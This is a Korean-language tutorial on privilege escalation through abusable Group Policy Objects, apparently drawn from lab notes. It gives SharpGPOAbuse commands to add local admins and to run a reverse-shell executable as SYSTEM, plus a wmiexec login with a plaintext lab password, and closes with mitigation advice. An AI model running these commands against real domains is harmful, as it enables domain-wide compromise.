


# GPO(그룹 정책 개체)를 이용한 권한 상승 가이드

GPO(Group Policy Object)는 Active Directory 내의 사용자 및 컴퓨터에 대한 정책(소프트웨어 설치, 스크립트 실행, 암호 정책 등)을 중앙에서 관리하는 강력한 기능입니다. 만약 공격자가 특정 GPO를 편집할 권한을 획득한다면, 해당 GPO가 적용되는 모든 컴퓨터에서 `SYSTEM` 권한으로 코드를 실행할 수 있습니다.

---

### **1. 취약점 식별**

- **목표:** 현재 공격자가 제어할 수 있는 계정이 편집 권한을 가진 GPO를 찾습니다.
- **핵심 도구:** BloodHound, PowerView

#### **BloodHound 활용**
- BloodHound는 이 공격 경로를 시각적으로 보여주는 가장 효과적인 도구입니다. "Find GPO Edit Rights" 또는 "Find Shortest Paths to Domain Admins" 같은 쿼리를 실행하면, 현재 사용자가 편집할 수 있는 GPO와 그 영향력을 한눈에 파악할 수 있습니다.

#### **PowerView를 이용한 수동 열거**
- `PowerView.ps1` 스크립트를 사용하여 특정 GPO의 권한을 수동으로 확인할 수 있습니다.

```powershell title="PowerView로 GPO 권한 확인"
# 특정 GPO의 ACL(Access Control List) 확인
Get-ObjectAcl -ResolveGUIDs -Name "<GPO_Name>"
```

---

### **2. `SharpGPOAbuse`를 이용한 공격**

- **[GitHub 링크](https://github.com/FSecureLABS/SharpGPOAbuse)**
- `SharpGPOAbuse`는 GPO 편집 권한을 악용하는 과정을 자동화해주는 최고의 도구입니다.

#### **공격 시나리오 A: 로컬 관리자 추가 (은밀한 방식)**
- **전략:** GPO를 수정하여 특정 사용자를 GPO가 적용되는 모든 컴퓨터의 로컬 관리자 그룹에 추가합니다. 이 방법은 즉시 셸을 획득하는 것은 아니지만, 탐지될 가능성이 낮습니다.

```powershell(title="SharpGPOAbuse - 로컬 관리자 추가")
# --AddLocalAdmin: 로컬 관리자 추가 모드
# --UserAccount: 관리자로 추가할 사용자 계정
# --GPOName: 공격 대상 GPO의 이름
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <attacker_user> --GPOName "Vulnerable GPO"
```

#### **공격 시나리오 B: 즉시 실행 작업 추가 (공격적인 방식)**
- **전략:** GPO에 즉시 실행되는 예약 작업을 추가하여, 리버스 셸과 같은 악성 코드를 `SYSTEM` 권한으로 실행시킵니다.

```powershell(title="SharpGPOAbuse - 즉시 실행 작업 추가")
# --AddImmediateTask: 즉시 실행 예약 작업 추가 모드
# --Command: 실행할 명령어
# --TaskName: 작업 이름
./SharpGPOAbuse.exe --AddImmediateTask --TaskName "Updates" --Command "C:\Temp\revshell.exe" --GPOName "Vulnerable GPO"
```

#### **정책 업데이트 강제 적용**
- GPO 변경 사항은 기본적으로 90~120분마다 클라이언트 컴퓨터에 적용됩니다. 만약 대상 컴퓨터에 이미 셸이 있다면, `gpupdate /force` 명령어로 정책을 즉시 업데이트하여 공격을 트리거할 수 있습니다.


```powershell
gpupdate /force
```

```powershell
net user enterprise-security
```

```bash title="공격자 Kali"
rlwrap impacket-wmiexec 'vulnnet.local/enterprise-security:sand_0873959498'@$target
```

---

### **3. 방어 (Mitigation)**

- **권한 최소화:** GPO 편집 권한은 도메인 관리자(Domain Admins)와 동일한 수준의 민감한 권한으로 취급해야 합니다. `Group Policy Creator Owners` 그룹의 멤버십을 엄격하게 관리하고, 일반 관리자에게 GPO 편집 권한을 위임하지 않습니다.
- **정기적인 감사:** BloodHound나 PowerShell 스크립트를 사용하여 주기적으로 GPO 권한 설정을 감사하고, 비정상적인 권한 할당을 모니터링합니다.

